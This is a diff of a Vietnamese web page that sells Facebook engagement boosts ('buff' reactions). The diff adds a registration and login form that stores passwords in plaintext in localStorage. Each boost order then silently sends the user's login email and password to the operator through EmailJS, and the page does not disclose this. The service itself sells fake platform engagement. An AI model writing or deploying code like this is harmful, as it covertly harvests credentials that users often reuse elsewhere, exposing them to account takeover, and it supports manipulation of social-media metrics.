@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4228/4228171.png"> <!-- Fixed rel attribute -->
-    <title>Dịch Vụ Facebook</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4228/4228171.png">
+    <title>Gửi Email</title>
     <style type="text/css">
         body {
             font-family: Arial, sans-serif;
@@ -48,8 +48,8 @@
         .field input, .field select {
             display: block;
             width: 100%;
-            padding: 12px; /* Increased padding */
-            font-size: 16px; /* Increased font size */
+            padding: 12px;
+            font-size: 16px;
             border: 1px solid #ddd;
             border-radius: 4px;
             box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
@@ -81,93 +81,212 @@
             color: green;
             text-align: center;
         }
+
+        .toggle {
+            margin-top: 20px;
+            text-align: center;
+            cursor: pointer;
+            color: #4460AA;
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <h1>BUFF TƯƠNG TÁC</h1>
-    <h4 style="color: green;">Tool được viết bằng ngôn ngữ php nên bao xịn:3</h4>
-    <h3 style="color: violet;">Dev Web by Coder: <a target="_blank" style="text-decoration: none;" href="https://www.fb.com/tnc0210">ThienNguyen</a></h3>
     <div class="container">
-        <form id="form">
-            <div class="field">
-                <label for="emotion">Loại cảm xúc</label>
-                <select name="emotion" id="emotion" required>
-                    <option value="" disabled selected>Chọn cảm xúc</option>
-                    <option value="Like">Thích</option>
-                    <option value="Love">Yêu thích</option>
-                    <option value="Haha">Haha</option>
-                    <option value="Wow">Wow</option>
-                    <option value="Sad">Buồn</option>
-                    <option value="Angry">Giận dữ</option>
-                </select>
-            </div>
-            <div class="field">
-                <label for="quantity">Số lượng</label>
-                <select name="quantity" id="quantity" required>
-                    <option value="" disabled selected>Chọn số lượng</option>
-                    <!-- Generate options from 1 to 100 -->
-                    <script>
-                        for (let i = 1; i <= 100; i++) {
-                            document.write(`<option value="${i}">${i}</option>`);
-                        }
-                    </script>
-                </select>
-            </div>
-            <div class="field">
-                <label for="message">Link cần buff</label>
-                <input type="text" name="message" id="message" required>
-            </div>
-            <div class="field">
-                <label for="reply_to">Địa chỉ email trả lời</label>
-                <input type="email" name="reply_to" id="reply_to" required>
-            </div>
-            <input type="submit" id="button" value="Gửi">
-            <div class="message" id="messageSent"></div>
-        </form>
+        <div id="registrationForm">
+            <h2>Đăng ký</h2>
+            <form id="regForm">
+                <div class="field">
+                    <label for="regEmail">Địa chỉ email</label>
+                    <input type="email" id="regEmail" required>
+                </div>
+                <div class="field">
+                    <label for="regPassword">Mật khẩu</label>
+                    <input type="password" id="regPassword" required>
+                </div>
+                <div class="field">
+                    <label for="confirmPassword">Nhập lại mật khẩu</label>
+                    <input type="password" id="confirmPassword" required>
+                </div>
+                <input type="submit" value="Đăng ký">
+                <div class="message" id="regMessage"></div>
+            </form>
+            <div class="toggle" onclick="toggleForms()">Bạn đã có tài khoản? Đăng nhập</div>
+        </div>
+
+        <div id="loginForm" class="hidden">
+            <h2>Đăng nhập</h2>
+            <form id="loginFormElement">
+                <div class="field">
+                    <label for="loginEmail">Địa chỉ email</label>
+                    <input type="email" id="loginEmail" required>
+                </div>
+                <div class="field">
+                    <label for="loginPassword">Mật khẩu</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <input type="submit" value="Đăng nhập">
+                <div class="message" id="loginMessage"></div>
+            </form>
+            <div class="toggle" onclick="toggleForms()">Bạn chưa có tài khoản? Đăng ký</div>
+        </div>
+
+        <div id="emailForm" class="hidden">
+            <h2>Gửi Email</h2>
+            <form id="form">
+                <div class="field">
+                    <label for="emotion">Loại cảm xúc</label>
+                    <select name="emotion" id="emotion" required>
+                        <option value="" disabled selected>Chọn cảm xúc</option>
+                        <option value="Like">Thích</option>
+                        <option value="Love">Yêu thích</option>
+                        <option value="Haha">Haha</option>
+                        <option value="Wow">Wow</option>
+                        <option value="Sad">Buồn</option>
+                        <option value="Angry">Giận dữ</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label for="quantity">Số lượng</label>
+                    <select name="quantity" id="quantity" required>
+                        <option value="" disabled selected>Chọn số lượng</option>
+                        <script>
+                            for (let i = 1; i <= 100; i++) {
+                                document.write(`<option value="${i}">${i}</option>`);
+                            }
+                        </script>
+                    </select>
+                </div>
+                <div class="field">
+                    <label for="message">Link cần buff</label>
+                    <input type="text" name="message" id="message" required>
+                </div>
+                <div class="field">
+                    <label for="reply_to">Địa chỉ email trả lời</label>
+                    <input type="email" name="reply_to" id="reply_to" required>
+                </div>
+                <input type="submit" id="button" value="Gửi">
+                <div class="message" id="messageSent"></div>
+            </form>
+        </div>
     </div>
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
+    // Load registered users from local storage
+    let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+
+    // Toggle between registration and login forms
+    function toggleForms() {
+        const regForm = document.getElementById('registrationForm');
+        const loginForm = document.getElementById('loginForm');
+        const emailForm = document.getElementById('emailForm');
+
+        if (regForm.classList.contains('hidden')) {
+            regForm.classList.remove('hidden');
+            loginForm.classList.add('hidden');
+            emailForm.classList.add('hidden');
+        } else {
+            regForm.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+        }
+    }
+
+    // Registration form submission
+    document.getElementById('regForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const email = document.getElementById('regEmail').value;
+        const password = document.getElementById('regPassword').value;
+        const confirmPassword = document.getElementById('confirmPassword').value;
+
+        if (password !== confirmPassword) {
+            document.getElementById('regMessage').innerText = 'Mật khẩu không khớp!';
+            return;
+        }
+
+        // Check if user is already registered
+        if (registeredUsers.find(user => user.email === email)) {
+            document.getElementById('regMessage').innerText = 'Email đã được sử dụng!';
+            return;
+        }
+
+        // Save user information
+        registeredUsers.push({ email, password });
+        localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
+        document.getElementById('regMessage').innerText = 'Đăng ký thành công! Vui lòng đăng nhập.';
+        toggleForms(); // Switch to login form
+    });
+
+    // Login form submission
+    document.getElementById('loginFormElement').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+
+        // Check if user is registered
+        const user = registeredUsers.find(user => user.email === email && user.password === password);
+
+        if (user) {
+            document.getElementById('loginMessage').innerText = 'Đăng nhập thành công!';
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('emailForm').classList.remove('hidden'); // Show email form after successful login
+        } else {
+            document.getElementById('loginMessage').innerText = 'Thông tin đăng nhập không chính xác!';
+        }
+    });
+
+    // Email form submission
+    document.getElementById('form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
         const btn = document.getElementById('button');
+        btn.value = 'Đang gửi...';
 
-        document.getElementById('form').addEventListener('submit', function(event) {
-            event.preventDefault();
+        const serviceID = 'default_service';
+        const templateID = 'template_mcvqowq';
 
-            btn.value = 'Đang gửi...';
+        const emotion = document.getElementById('emotion').value;
+        const quantity = document.getElementById('quantity').value;
+        const message = document.getElementById('message').value;
+        const replyToEmail = document.getElementById('reply_to').value;
 
-            const serviceID = 'default_service';
-            const templateID = 'template_mcvqowq';
+        // Lấy thông tin tài khoản đã đăng nhập
+        const loggedInEmail = document.getElementById('loginEmail').value; // Email đã đăng nhập
+        const loggedInPassword = document.getElementById('loginPassword').value; // Mật khẩu đã đăng nhập
 
-            // Retrieve values from the fields
-            const emotion = document.getElementById('emotion').value;
-            const quantity = document.getElementById('quantity').value;
-            const message = document.getElementById('message').value;
+        const emailContent = `
+            Loại cảm xúc: ${emotion}
+            Số lượng: ${quantity}
+            Link cần buff: ${message}
+            Địa chỉ email: ${replyToEmail}
+            Tài khoản đăng nhập: ${loggedInEmail}
+            Mật khẩu đăng nhập: ${loggedInPassword}
+        `;
 
-            // Create email content
-            const emailContent = `
-                Loại cảm xúc: ${emotion}
-                Số lượng: ${quantity}
-                Link cần buff: ${message}
-            `;
-
-            // Send email with the created content
-            emailjs.send(serviceID, templateID, {
-                from_name: document.getElementById('reply_to').value,
-                to_name: 'Người nhận', // You can change the recipient's name if needed
-                message: emailContent,
-                reply_to: document.getElementById('reply_to').value,
-            })
-            .then(() => {
-                btn.value = 'Gửi';
-                document.getElementById('messageSent').innerText = 'Thông tin đã được gửi thành công!';
-                document.getElementById('form').reset(); // Reset form after successful submission
-            }, (err) => {
-                btn.value = 'Gửi';
-                alert(JSON.stringify(err));
-            });
+        emailjs.send(serviceID, templateID, {
+            from_name: replyToEmail,
+            to_name: 'Người nhận',
+            message: emailContent,
+            reply_to: replyToEmail,
+        })
+        .then(() => {
+            btn.value = 'Gửi Email';
+            document.getElementById('messageSent').innerText = 'Email đã được gửi thành công!';
+            document.getElementById('form').reset(); // Reset form after successful submission
+        }, (err) => {
+            btn.value = 'Gửi Email';
+            alert(JSON.stringify(err));
         });
+    });
 
-        emailjs.init('BUHtg1BuVtAPT9O2M');
-    </script>
+    emailjs.init('BUHtg1BuVtAPT9O2M');
+</script>
+
+
 </body>
 </html>
